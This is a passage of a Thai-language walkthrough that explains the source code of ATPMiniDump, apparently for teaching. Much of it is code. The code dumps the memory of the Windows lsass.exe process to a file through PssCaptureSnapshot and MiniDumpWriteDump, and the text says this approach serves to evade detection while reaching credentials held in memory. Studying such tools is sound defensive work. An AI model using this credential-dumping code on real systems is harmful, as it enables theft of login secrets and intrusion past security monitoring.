หลังจากนั้นฟังก์ชัน `GetPID()` ถูกเรียกใช้งานโดยมีการระบุตัวแปร `pWinVerInfo` เอาไว้เป็นข้อมูลนำเข้า หากใครได้อ่าน[การอธิบายฟังก์ชัน `GetPID()`](#getpid-function) มาแล้วจะเข้าใจได้ทันทีว่าฟังก์ชัน `GetPID()` จะมีการนำค่า `pWinVerInfo.ProcName` ไปหา process ID ก่อนจะนำผลลัพธ์ที่ได้ไปเก็บไว้ใน `pWinVerInfo.hTargetPID`

เมื่อทราบเป้าหมายแล้วว่าโปรเซส `lsass.exe` มีการทำงานอยู่และมี process ID ใด ฟังก์ชัน `wmain()` จะเริ่มทำการสร้างการเข้าถึงหน่วยความจำในโปรเซส `lsass.exe` ทันทีตามตัวอย่างโค้ดด้านล่าง

```cpp
wprintf(L"	[+] Open a process handle.\n");
HANDLE hProcess = NULL;
OBJECT_ATTRIBUTES ObjectAttributes;
InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
```

มีการสร้างตัวแปรใหม่ขึ้นมาในส่วนแรก 2 รายการ ได้แก่ `hProcess` ประเภท `HANDLE` ซึ่งทำให้เราสามารถเดาได้คร่าวๆ ว่าเมื่อตัวแปรนี้ถูกนำมาใช้งาน มันจะเก็บ process handle ของโปรเซสใด โปรเซสหนึ่งเอาไว้

ตัวแปร `ObjectAttributes` เป็นอีกตัวแปรที่ถุกสร้างขึ้นมาพร้อมๆ กับ `hProcess` โดย `ObjectAttributes` เป็นตัวแปรประเภท `OBJECT_ATTRIBUTES` สำหรับการกำหนดคุณลักษณะของออบเจ็กต์ ตัวแปร `ObjectAttributes` ยังมีการถูก initialize เอาไว้ด้วยฟังก์ชัน `InitializeObjectAttributes()` ซึ่งทำให้คาดเดาได้ว่าตัวแปร `ObjectAttributes` อาจถูกใช้ในอนาคต ลักษณะของพารามิเตอรที่ระบุให้กับฟังก์ชัน `InitializeObjectAttributes()` ยังไม่มีลักษณะพิเศษใดๆ เป็นเพียงการ initialize แบบว่างเปล่าเอาไว้เท่านั้น

```cpp
CLIENT_ID uPid = { 0 };
uPid.UniqueProcess = pWinVerInfo->hTargetPID;
uPid.UniqueThread = (HANDLE)0;

ULONG rights = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
printf("Access rights %x\n", rights);
```

ต่อมามีการสร้างตัวแปรใหม่เพิ่มขึ้นมาอีก 2 รายการ ได้แก่ `uPid` เป็นประเภท `CLIENT_ID` ที่ถูกระบุเอาไว้ใน[ไฟล์ `ATPMiniDump.h` บรรทัดที่ 67](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L67) หลังจากถูกสร้างขึ้น ตัวแปร `uPid` มีการถูกกำหนดค่าทันทีตามโครงสร้างของประเภท `CLIENT_ID` โดยค่า `uPid.UniqueProcess` ถูกกำหนดให้เป็นค่า process ID ของ `lsass.exe` ตามที่เก็บเอาไว้ใน `pWinVerInfo.hTargetPID` และค่า `uPid.UniqueThread` ถูกกำหนดให้เป็นค่า 0 ในประเภท `HANDLE`

ตัวแปรที่สองคือ `rights` โดยมีการกำหนดค่าตาม access rights ของโปรเซสที่ระบุไว้ใน[เอกสารของไมโครซอฟต์](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) เราคาดว่าค่าในตัวแปร `rights` จะถูกนำมาใช้อีกครั้งเพื่อระบุสิทธิ์ที่เราจะขอเข้าถึงโปรเซส

```cpp
_ZwOpenProcess ZwOpenProcess = (_ZwOpenProcess) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwOpenProcess");
if (ZwOpenProcess == NULL) {
  return FALSE;
}
	
NTSTATUS status = ZwOpenProcess(
  &hProcess, // ProcessHandle
  rights, // DesiredAccess
  &ObjectAttributes, // ObjectAttributes
  &uPid // ClientId
);
printf("ZwOpenProcess Handle %d\n", hProcess);
if (hProcess == NULL) {
  wprintf(L"	[!] Failed to get processhandle.\n");
  exit(1);
}
```

โค้ดส่วนต่อมาคือการสร้าง function pointer ของฟังก์ชัน `ZwOpenProcess()` และการเรียกใช้ฟังก์ชัน `ZwOpenProcess()` เราจะเห็นได้จากพารามิเตอร์ของฟังก์ชัน `ZwOpenProcess()` ว่าตัวแปรซึ่งถูกสร้างและกำหนดค่ามาก่อนหน้านั้นถูกใช้อย่างไร ในกรณีที่การทำงานของฟังก์ชัน `ZwOpenProcess()` เสร็จสิ้น ตัวแปร `hProcess` จะเก็บ process handle สำหรับโปรเซส `lsass.exe` ซึ่งสามารถนำไปใช้ต่อได้จนกว่า process handle ดังกล่าวจะถูกทำลายทิ้ง

```cpp
HANDLE snapshotHandle;

DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE
  | PSS_CAPTURE_HANDLES
  | PSS_CAPTURE_HANDLE_NAME_INFORMATION
  | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
  | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
  | PSS_CAPTURE_HANDLE_TRACE
  | PSS_CAPTURE_THREADS
  | PSS_CAPTURE_THREAD_CONTEXT
  | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
  | PSS_CREATE_BREAKAWAY
  | PSS_CREATE_BREAKAWAY_OPTIONAL
  | PSS_CREATE_USE_VM_ALLOCATIONS
  | PSS_CREATE_RELEASE_SECTION;

DWORD hr = PssCaptureSnapshot(
  hProcess, // ProcessHandle
  flags, // CaptureFlags
  CONTEXT_ALL, // ThreadContextFlags
  &snapshotHandle // *SnapshotHandle
  );
printf("Snapshot Handle %d\n", hr);
```

โค้ดในส่วนต่อซึ่งแสดงให้เห็นด้านบนคือส่วนที่ถูกพัฒนาเพิ่มเติมเข้ามาเพื่อให้มีการใช้ฟังก์ชัน `PssCaptureSnapshot()` ในการช่วยข้ามผ่านและหลบหลีกการตรวจจับเพื่อการเข้าถึงข้อมูลสำหรับยืนยันตัวตนในหน่วยความจำ โค้ดส่วนแรกแสดงให้เห็นการสร้างตัวแปรใหม่ประเภท `HANDLE` ชื่อ `snapshotHandle` จากนั้นเราจะเห็นการสร้างอีกตัวแปรหนึ่งคือ `flags` ในประเภท `DWORD` ซึ่งจะทำการเก็บ flag สำหรับฟังก์ชัน `PssCaptureSnapshot()` เอาไว้ เราสามารถทำความเข้าใจค่า flag แล้วนี้ได้เสมือนกับมันเป็นตัวเลือกในการใช้งานฟังก์ชัน `PssCaptureSnapshot()`

เราสามารถทำความเข้าใจความหมายของแต่ละ flag ซึ่งถูกระบุอยู่ในตัวแปร `flags` ได้จาก[เอกสารของไมโครซอฟต์](https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/ne-processsnapshot-pss_capture_flags)

ตัวแปรใหม่เหล่านี้ที่ถูกสร้างมาก่อนหน้ากำลังจะถูกใช้ในโค้ดบรรทัดต่อมา ฟังก์ชัน `PssCaptureSnapshot()` มีการถูกเรียกใช้และมีการกำหนดให้ตัวแปร `hr` ประเภท `DWORD` นั้นคอยรับค่าที่ฟังก์ชัน `PssCaptureSnapshot()` จะส่งออกมาหลังจากทำงานจนเสร็จ พารามิเตอร์ที่มีการใช้ในฟังก์ชัน `PssCaptureSnapshot()` สามารถอธิบายได้ดังนี้

- พารามิเตอร์ `ProcessHandle` ซึ่งในที่นี้คือ `hProcess` ถูกระบุเป็น process handle สำหรับโปรเซสเป้าหมายที่เราต้องการจะใช้ฟังก์ชัน `PssCaptureSnapshot()` ในการสร้าง snapshot
- พารามิเตอร์ `CaptureFlags` ซึ่งในที่นี้คือ `flags` เป็นตัวเลือกหรือออปชันสำหรับการเรียกใช้ฟังก์ชัน `PssCaptureSnapshot()` โดยการเลือกตั้งค่า `flags` ก็จะส่งผลให้มีการสร้าง snapshot ด้วยข้อมูลที่ต่างออกไป อาทิ หากกำหนดให้มี `PSS_CAPTURE_HANDLES` ฟังก์ชัน `PssCaptureSnapshot()` ก็จะทำการเก็บรายการของ handle ของโปรเซสดังกล่าวด้วย
- พารามิเตอร์ `ThreadContextFlags` ซึ่งในที่นี้คือ `CONTEXT_ALL` เป็น flag ซึ่งจะใช้ระบุ flag สำหรับ thread ในกรณีที่ `flags` มีการกำหนดเกี่ยวข้องกับการทำงานในระดับ thread
- พารามิเตอร์ `*SnapshotHandle` ซึ่งในที่นี้คือ `&snapshotHandle` เป็น handle สำหรับ snapshot ซึ่งฟังก์ชันนี้จะดำเนินการบันทึก

ในสถานการณ์ที่ `hProcess` เป็น handle ของ `lsass.exe` เราคาดหวังว่าหลังจาก `PssCaptureSnapshot` ทำงานจนเสร็จแล้ว เราจะสามารถเข้าถึง snapshot ได้ที่ตำแหน่งของ `snapshotHandle`

```cpp
MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
CallbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback;
CallbackInfo.CallbackParam = NULL;
```

ต่อมาตัวแปร `CallbackInfo` ที่มีประเภทข้อมูลคือ `MINIDUMP_CALLBACK_INFORMATION` โดยพื้นที่ในหน่วยความจำของตัวแปร `CallbackInfo` ถูกเขียนทับด้วยค่าศูนย์ผ่านฟังก์ชัน `ZeroMemory` ให้มีขนาดเท่ากับขนาดของข้อมูลประเภท `MINIDUMP_CALLBACK_INFORMATION`

โครงสร้างของประเภทข้อมูล `MINIDUMP_CALLBACK_INFORMATION` ได้ถูกระบุไว้แล้วใน `DbgHelp.h` ซึ่งมีโครงสร้างตามรายละเอียดด้านล่าง

```cpp
typedef struct _MINIDUMP_CALLBACK_INFORMATION {
  MINIDUMP_CALLBACK_ROUTINE CallbackRoutine;
  PVOID                     CallbackParam;
} MINIDUMP_CALLBACK_INFORMATION, *PMINIDUMP_CALLBACK_INFORMATION;
```

อ้างอิงจากเอกสารของไมโครซอฟต์ `MINIDUMP_CALLBACK_INFORMATION` มีความเกี่ยวข้องฟังก์ชัน `MiniDumpWriteDump()` ซึ่งสามารถใช้เพื่อทำการสร้างไฟล์ที่มีข้อมูลของ minidump ได้ เราจึงสามารถคาดเดาจุดประสงค์ของสิ่งที่จะเกิดขึ้นต่อไปได้ว่าโค้ดอาจพยายามที่จะสร้างไฟล์ minidump จากข้อมูลซึ่งถูกชี้โดย `snapshotHandle`

จากโครงสร้างของ `MINIDUMP_CALLBACK_INFORMATION` โค้ดในส่วนถัดมาหลังจากการเรียกใช้ฟังก์ชัน `ZeroMemory()` จะแสดงให้เห็นถึงการกำหนดให้กับสมาชิกในโครงสร้างโดยมีการกำหนดให้ `CallbackInfo.CallbackRoutine` มีค่าเป็น `ATPMiniDumpWriteDumpCallBack` และค่า `CallbackInfo.CallbackParam` มีค่าเป็น `NULL`

เราจะเห็นการกำหนด `ATPMiniDumpWriteDumpCallback` ในลักษณะของ callback ที่[บรรทัดที่ 301](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L301) ตามโค้ดด้านล่าง

```cpp
BOOL CALLBACK ATPMiniDumpWriteDumpCallback(
	__in     PVOID CallbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	switch (CallbackInput->CallbackType)
	{
	case 16: // IsProcessSnapshotCallback
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}
```

Callback คือลักษณะของฟังก์ชันซึ่งจะถูกเรียกใช้เมื่อเกิดเหตุการณ์หนึ่งขึ้นมา โดยการเรียกใช้ callback จะต้องมีการ register หรือ "ผูก" มันไว้ก่อนซึ่งในบางครั้งก็ทำได้โดยการระบุชื่อของฟังก์ชัน callback ไปเป็นอากิวเมนต์ ในกรณีนี้การระบุ `ATPMiniDumpWriteDumpCallBack` ไว้ให้กับ `CalbackInfo.CallbackRoutine` อาจแสดงให้เห็นถึงการ register ฟังก์ชัน callback เอาไว้ใช้ภายหลัง

จนถึงจุดนี้ หากฟังก์ชันทำงานจนเสร็จสิ้นและโปรแกรมไม่ได้มีการหยุดการทำงาน กระบวนการในขั้นที่มีการเข้าถึงหน่วยความจำของโปรเซส `lsass.exe` และทำ snapshot ด้วยฟังก์ชัน `PssCaptureSnapshot` ก็ถือได้ว่าเสร็จสิ้น ในส่วนต่อไป ฟังก์ชัน `wmain()` จะดำเนินการในขั้นตอนสุดท้ายคือการเรียกใช้ฟังก์ชัน `MiniDumpWriteDump()` เพื่อสร้างไฟล์จากข้อมูล snapshot

```cpp
wprintf(L"[3] Create memorydump file:\n");

WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
WCHAR chWinPath[MAX_PATH];
GetWindowsDirectory(chWinPath, MAX_PATH);
wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dumpert.dmp");

UNICODE_STRING uFileName;
RtlInitUnicodeString(&uFileName, chDmpFile);
wprintf(L"	[+] Dump %wZ memory to: %wZ\n", pWinVerInfo->ProcName, uFileName);
```

โค้ดด้านบนแสดงให้เห็นการเตรียมการเพื่อการเขียนไฟล์ โดยมีการสร้างพาธและชื่อไฟล์เพื่อรองรับการสร้างไฟล์เอาไว้


```cpp
HANDLE hDmpFile = NULL;

IO_STATUS_BLOCK IoStatusBlock;
ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));

OBJECT_ATTRIBUTES FileObjectAttributes;
InitializeObjectAttributes(
  &FileObjectAttributes,
  &uFileName,
  OBJ_CASE_INSENSITIVE,
  NULL,
  NULL
);

_NtCreateFile NtCreateFile = (_NtCreateFile)
  GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateFile");
if (NtCreateFile == NULL) {
  return FALSE;
}

_ZwClose ZwClose = (_ZwClose)
  GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwClose");
if (ZwClose == NULL) {
  return FALSE;
}

status = NtCreateFile(
  &hDmpFile, // FileHandle
  FILE_GENERIC_WRITE, // DesiredAccess
  &FileObjectAttributes, // ObjectAttributes
  &IoStatusBlock, // IoStatusBlock
  0, // AllocationSize
  FILE_ATTRIBUTE_NORMAL, // FileAttributes
  FILE_SHARE_WRITE, // ShareAccess
  FILE_OVERWRITE_IF, // CreateDisposition
  FILE_SYNCHRONOUS_IO_NONALERT, // CreateOptions
  NULL, //EaBuffer
  0 // EaLength
);

if (hDmpFile == INVALID_HANDLE_VALUE) {
  wprintf(L"	[!] Failed to create dumpfile.\n");
  ZwClose(hProcess);
  exit(1);
}
```

โค้ดด้านบนหากอ่านจากข้างล่างขึ้นข้างบนอาจช่วยให้เข้าใจที่มาและที่ไปได้ดีมากกว่า จุดประสงค์ของโค้ดยาวๆ ข้างบนนั้นไม่ได้มีอะไรไปมากกว่าการสร้างไฟล์เปล่าขึ้นมาเตรียมเอาไว้เพื่อรอการเขียนข้อมูลจากฟังก์ชัน `MiniDumpWriteDump()` ด้วยฟังก์ชัน `NtCreateFile()` ซึ่งมีฟังก์ชัน `ZwClose()` ติดมาด้วยกรณีที่เกิดข้อผิดพลาดหรือฟังก์ชันทำงานจนเสร็จสิ้นก็จะสามารถใช้ฟังก์ชัน `ZwClose()` ในการทำลาย handle ที่ค้างอยู่ได้ เนื่องจากทั้ง 2 ฟังก์ชันนี้มีอยู่ในไลบรารี `ntdll.dll` การสร้าง function pointer ซึ่งชี้ไปยัง 2 ฟังก์ชันนี้จึงจำเป็นต้องมีการทำก่อนเรียกใช้

เพื่อที่จะสร้างไฟล์เปล่าด้วยฟังก์ชัน `NtCreateFile()` เราจำเป็นต้องเตรียมและเติมค่าในอากิวเมนต์ให้กับฟังก์ชันนี้ให้เต็มก่อน เราจึงเห็นกระบวนการเตรียมในแต่ละส่วนได้ดังนี้

- พารามิเตอร์ `FileHandle` ซึ่งในที่นี้คือ `&hDmpFile` คือ file handle สำหรับไฟล์ที่สร้างใหม่ การดำเนินการใดๆ กับไฟล์ไม่ว่าจะเป็นการเขียนหรือแก้ไขก็จำเป็นที่จะต้องใช้ file handle นี้ในการอ้างถึง เราเห็นการสร้าง `hDmpFile` และกำหนดค่าให้เป็น `NULL` ในส่วนแรก
- พารามิเตอร์ `DesiredAccess` ซึ่งในที่นี้คือ `FILE_GENERIC_WRITE` เป็นการระบุสิทธิ์ในการเข้าถึง โดยสิทธิ์ที่มีการระบุนี้นั้นเป็นการระบุที่บ่งชี้ให้เห็นถึงการเปิดไฟล์เพื่อเขียน
- พารามิเตอร์ `ObjectAttributes` ซึ่งในที่นี้คือ `&FileObjectAttributes` ถูกระบุไปยังตำแหน่งในหน่วยความจำของ `FileObjectAttributes` โดยตัวแปรดังกล่าวมีไว้เพื่อกำหนดคุณลักษณะของ [kernel object](https://docs.microsoft.com/en-us/windows/win32/sysinfo/kernel-objects)
- พารามิเตอร์ `IoStatusBlock` ซึ่งในที่นี้คือ `&IoStatusBlock` คือพอยน์เตอร์ซึ่งชี้ไปยังตำแหน่งในหน่วยความจำสำหรับการรับสถานะการทำงานเมื่อมีการดำเนินการเสร็จ โดยในกรณีของฟังก์ชัน `NtCreateFile()` นั้น ค่าใน `IoStatusBlock` อาจมีได้ อาทิ `FILE_CREATED` หรือ `FILE_OPENED` เป็นต้น ตัวแปร `IoStatusBlock` ได้ถูกสร้างจาก `IO_STATUS_BLOCK` และผ่านฟังก์ชัน `ZeroMemory()` เป็นที่เรียบร้อยแล้ว
- ค่า `0` ในตำแหน่ง `AllocationSize` ใช้ระบุขนาดในหน่วยของไบต์ของไฟล์ที่จะสร้างขึ้น
- พารามิเตอร์ `FileAttributes` ซึ่งในที่นี้คือ `FILE_ATTRIBUTE_NORMAL` คือการระบุคุณลักษณะของไฟล์ซึ่งสามารถดูเพิ่มเติมได้ที่ [File Attribute Constants](https://docs.microsoft.com/en-us/windows/win32/fileio/file-attribute-constants)
- พารามิเตอร์ `ShareAccess` ซึ่งในที่นี้คือ `FILE_SHARE_WRITE` คือการระบุลักษณะและขอบเขตในการแบ่งปันการเข้าถึง
- พารามิเตอร์ `CreateDisposition` ซึ่งในที่นี้คือ `FILE_OVERWRITE_IF` คือการระบุลักษณะในการดำเนินการกับไฟล์ โดยในกรณีนี้นั้น `FILE_OVERWRITE_IF` หมายถึงถ้ามีไฟล์ในชื่อเดียวกันถูกสร้างขึ้นมาแล้ว ให้ทำการเปิดและเขียนทับไฟล์ดังกล่าวทันที แต่หากยังไม่มีไฟล์ดังกล่าว ให้ทำการสร้างไฟล์ใหม่ตามคุณลักษณะที่ได้ดำเนินเอาไว้
- พารามิเตอร์ `CreateOptions` ซึ่งในที่นี้คือ `FILE_SYNCHRONOUS_IO_NONALERT` เป็นหนึ่งในออปชั่นอื่นๆ ที่เกี่ยวข้องกับการสร้างไฟล์และเข้าถึงไฟล์ โดย `FILE_SYNCHRONOUS_IO_NONALERT` หมายถึงให้ดำเนินการใดๆ กับไฟล์ถูก sychronize และจัดการโดยระบบที่มีการทำ I/O queue เอาไว้
- ส่วน `NULL` ของ `EaBuffer` และ 0 ของ `EaLength` ใช้สำหรับระบุคุณลักษณะเพิ่มเติม (extended attributes) ให้กับไฟล์

โค้ดส่วนสุดท้ายด้านล่างจะแสดงให้เห็นถึงการเรียกใช้ฟังก์ชัน `MiniDumpWriteDump()` ในการเขียนข้อมูลจาก `snapshotHandle` ซึ่งเป็นผลมาจากการใช้ฟังก์ชัน `PssCaptureSnapshot()` ลงไปที่ `hDmpFile`

```cpp
BOOL Success = MiniDumpWriteDump(
  snapshotHandle, // hProcess
  dwTargetPID, // ProcessId
  hDmpFile, // hDmpFile
  MiniDumpWithFullMemory, // DumpType
  NULL, // ExceptionParam
  NULL, // UserStreamParam
  &CallbackInfo // CallbackParam
  );
if ((!Success))
{
  wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
}
else {
  wprintf(L"	[+] Dump succesful.\n");
}

ZwClose(hDmpFile);
ZwClose(hProcess);

return 0;
```

จุดที่น่าสนใจในการเรียกใช้ฟังก์ชัน `MiniDumpWriteDump()` คือพารามิเตอร์ `DumpType` ซึ่งมีการระบุ flag เอาไว้เป็น `MiniDumpWithFullMemory` ซึ่งหมายถึงการให้สร้าง minidump จากข้อมูลทุกส่วน ไม่ใช่เพียงแค่ส่วนโค้ดหรือส่วนข้อมูลปลีกย่อย

อีกจุดหนึ่งที่น่าสนใจคือหน้าที่ของพารามิเตอร์ `CallbackParam` ซึ่งในที่นี้คือ `CallbackInfo` หากเราดูที่เนื้อหาของโค้ดในฟังก์ชัน callback อย่าง `ATPMiniDumpWRiteDumpCallBack` ก็จะสามารถอธิบายได้ว่า `CallbackInfo` ถูกระบุเพื่อให้รับข้อมูลเพื่อเติมจากกระบวนการทำ minidump

```cpp
BOOL CALLBACK ATPMiniDumpWriteDumpCallback(
	__in     PVOID CallbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	switch (CallbackInput->CallbackType)
	{
	case 16: // IsProcessSnapshotCallback
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}
```

เมื่อฟังก์ชัน `MiniDumpWriteDump()` เรียกใช้ฟังก์ชัน `ATPMiniDumpWriteDumpCallback()` ฟังก์ชัน `MiniDumpWriteDump()` จะมีการส่งข้อมูลกลับมาในส่วนที่เป็น `CallbackParam` และ `CallbackInput` โดย `CallbackParam` จะเป็นส่วนที่แอปพลิเคชันหรือโปรแกรมกำหนดขึ้นมาเอง แต่ `CallbackInput` นั้นจะมีโครงสร้าง `MINIDUMP_CALLBACK_INPUT` ที่ระบบกำหนดมาให้ตามที่ระบุไว้ใน[เอกสารของไมโครซอฟต์](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_callback_input)

สิ่งที่ฟังก์ชัน `ATPMiniDumpWRiteDumpCallback()` ทำนั้นคือการระบุกลับไปยังฟังก์ชัน `MiniDumpWriteDump()` ว่า minidump ที่ถูกสร้างขึ้นนั้นมาจาก snapshot โดยอาศัยการกำหนดค่าใน `CallbackInput.CallbackType` ที่ 16 ซึ่งเป็นส่วนของ flag ชื่อ `IsProcessSnapshotCallback` ให้เป็น `S_FALSE` ใน `CallbackInput.CallbackType` (ดูเพิ่มเติม [Generate Dump File from a Process Snapshot](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file))

หลังจากเสร็จสิ้นกระบวนการทั้งหมดและไฟล์ถูกสร้างขึ้นพร้อมกับข้อมูลของ snapshot จากโปรเซส `lsass.exe` ทั้ง file handle และ process handle ก็จะถูกทำลายด้วยฟังก์ชัน `ZwClose()` เป็นอันจบการทำงานของฟังก์ชัน `wmain()`

### GetPID Function

> ดูโค้ดของฟังก์ชัน `GetPID()` แบบเต็มได้[ที่นี่](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L16)
> 
> โค้ดในฟังก์ชัน `GetPID()` มีการพยายามเรียกใช้ฟังก์ชันซึ่งอยู่ในไลบรารี DLL อื่น แนะนำให้อ่านหัวข้อ [Loading External Function with Function Pointer](#loading-external-function-with-function-pointer) เพิ่มเติมเพื่อความเข้าใจที่มากขึ้นครับ

ฟังก์ชัน `GetPID()` เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภท `BOOL` เป็นผลลัพธ์ ฟังก์ชันมีการระบุพารามิเตอร์เอาไว้โดยจะถูกเก็บไว้ในตัวแปร `pWinVerInfo` ซึ่งเป็นตัวแปรประเภท `PWIN_VER_INFO` ฟังก์ชัน `GetPID()` มีการถูกเรียกใช้งานเพียงหนึ่งครั้งจากโค้ดในฟังก์ชัน `wmain()` [บรรทัดที่ 182](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L182) ตามตัวอย่างด้านล่าง

```cpp
if (!GetPID(pWinVerInfo)) {
  wprintf(L"	[!] Enumerating process failed.\n");
  exit(1);
}
```

ผมจะขอยกที่มาของอากิวเมนต์ไว้อธิบายในฟังก์ชัน `wmain()` ซึ่งเป็นส่วนของโค้ดที่กำหนดขึ้นมา ดังนั้นในการอธิบายฟังก์ชัน `GetPID()` เราจะสมมติโครงสร้างที่สมบูรณ์ของข้อมูลในประเภท `PWIN_VER_INFO` ขึ้นมาเพื่อให้เข้าใจการทำงานได้ง่ายขึ้นแทน โดยโครงสร้างของข้อมูลประเภท `PWIN_VER_INFO` ถูกกำหนดอยู่ในไฟล์ `ATPMiniDump.h` [ในบรรทัดที่ 49](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L49) ตามโครงสร้างด้านล่าง

```cpp
typedef struct _WIN_VER_INFO {
	WCHAR chOSMajorMinor[8];
	DWORD dwBuildNumber;
	UNICODE_STRING ProcName;
	HANDLE hTargetPID;
	LPCSTR lpApiCall;
	INT SystemCall;
} WIN_VER_INFO, *PWIN_VER_INFO;
```
จากบทเรียนของเราในเรื่อง typedef (ข้ามไปอ่าน [Loading External Function with Function Pointer](#loading-external-function-with-function-pointer) ได้เพื่อความเข้าใจที่มากขึ้น) เราสามารถอธิบายการโค้ดด้านบนได้ดังนี้

- ทำการสร้างประเภทของข้อมูลใหม่ในชื่อ `_WIN_VER_INFO` จากประเภทข้อมูลแบบ `struct`
- ประเภทข้อมูลนี้จะมีโครงสร้างภายในคือ
  - เก็บค่า `chOSMajorMinor` แบบ wide character ขนาดอาเรย์ 8 ช่อง
  - เก็บค่า `dwBuildNumber` แบบ double word
  - เก็บค่า `ProcName` แบบสตริงที่ใช้ Unicode encoding
  - เก็บค่า `hTargetPID` ในลักษณะของ handle
  - เก็บค่า `lpApiCall` แบบพอยน์เตอร์แบบ 32 บิตซึ่งชี้ไปยังสตริงแบบ constant
  - เก็บค่า `SystemCall` แบบจำนวนเต็ม
- ชื่อของตัวแปรแบบ struct คือ `WIN_VER_INFO`
- ชื่อของพอยน์เตอร์ซึ่งชี้มายัง struct นี้คือ `*PWIN_VER_INFO`

ตอนนี้โครงสร้างด้านบนถูกส่งเข้ามาผ่านตัวแปรชื่อ `pWinVerInfo` ซึ่งมีการตั้งชื่อสมาชิกในโครงสร้างเอาไว้ให้สามารถตีความหมายได้ในตัวอยู่แล้วว่าสมาชิกแต่ละตัวจะเก็บข้อมูลอะไรเอาไว้

เริ่มต้นการทำงาน มีการ initialize ค่าในตัวแปร `pWinVerInfo` ก่อนหนึ่งครั้งที่ `pWinVerInfo.hTargetPID` โดยถูกกำหนดให้เป็นค่า `NULL` จากชื่อของฟังก์ชันหลักคือ `GetPID()` เราคงพอจะเดากันได้ว่าฟังก์ชันนี้น่าจะพยายามหาค่า `PID` ของโปรเซสใดโปรเซสหนึ่งซึ่งจะมาถูกเก็บเอาไว้ใน `pWinVerInfo.hTargetPID` ด้วยเป้าหมายนี้นั้น ลอจิคที่ดูสมเหตุสมผลคือการแสดงรายการของโปรเซสที่มีอยู่ในระบบ ณ ขณะนั้นทั้งหมด แล้วไล่หาค่า PID ด้วยปัจจัยบางอย่างก่อนที่จะนำมาเก็บไว้ที่ตำแหน่งดังกล่าว

หากใครได้อ่านฟังก์ชัน `wmain()` ก็อาจจะพอปะติดปะต่อได้ว่าตัวแปร `pWinVerInfo` ซึ่งเป็นค่านำเข้านั้นมีการกำหนดค่าไว้กับสมาชิก `pWinVerInfo.ProcName` ไว้อยู่แล้วว่าให้เป็นค่าใด ดังนั้นปัจจัยซึ่งจะนำมาใช้หาค่า `PID` จึงมีความเป็นไปได้สูงว่าจะมีการใช้ `pWinVerInfo.ProcName` ครับ ส่วนหากใครยังไม่ได้อ่านก็ไม่เป็นไร ยังไปต่อกันได้อยู่ครับ :)

ต่อมามีการใช้ท่า function pointer ในการโหลด 3 ฟังก์ชันกลุ่ม Windows Kernel API มาจาก `ntdll.dll` โดย 3 ฟังก์ชันนั้นคือ `ZwQuerySystemInformation()` ซึ่งมักถูกใช้สำหรับหาข้อมูลเกี่ยวกับระบบ, ฟังก์ชัน `NtAllocateVirtualMemory()` สำหรับการจองพื้นที่ในหน่วยความจำของโปรเซส และฟังก์ชัน `NtFreeVirtualMemory()` สำหรับการคืนพื้นที่หน่วยความจำที่จองมา

```cpp
_ZwQuerySystemInformation ZwQuerySystemInformation = (_ZwQuerySystemInformation) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
if (ZwQuerySystemInformation == NULL) {
		return FALSE;
}

_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
if (NtAllocateVirtualMemory == NULL) {
  return FALSE;
}

_NtFreeVirtualMemory NtFreeVirtualMemory = (_NtFreeVirtualMemory) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtFreeVirtualMemory");
if (NtFreeVirtualMemory == NULL) {
  return FALSE;
}
```

ฟังก์ชัน `ZwQuerySystemInformation()` เป็นฟังก์ชันแรกซึ่งถูกเรียกใช้ตามโค้ดด้านล่าง โดยก่อนที่จะมีการเรียกใช้ฟังก์ชันนี้นั้น โค้ดได้มีการสร้างและกำหนดค่าให้กับตัวแปร `uReturnLength` ซึ่งเป็นตัวแปรประเภท `ULONG` ให้มีค่าเป็น 0 ด้วย

```cpp
ULONG uReturnLength = 0;
NTSTATUS status = ZwQuerySystemInformation(
  SystemProcessInformation, // SystemInformationClass
  0, // SystemInformation
  0, // SystemInformationLength
  &uReturnLength // ReturnLength
);
if (!status == 0xc0000004) {
  return FALSE;
}
```

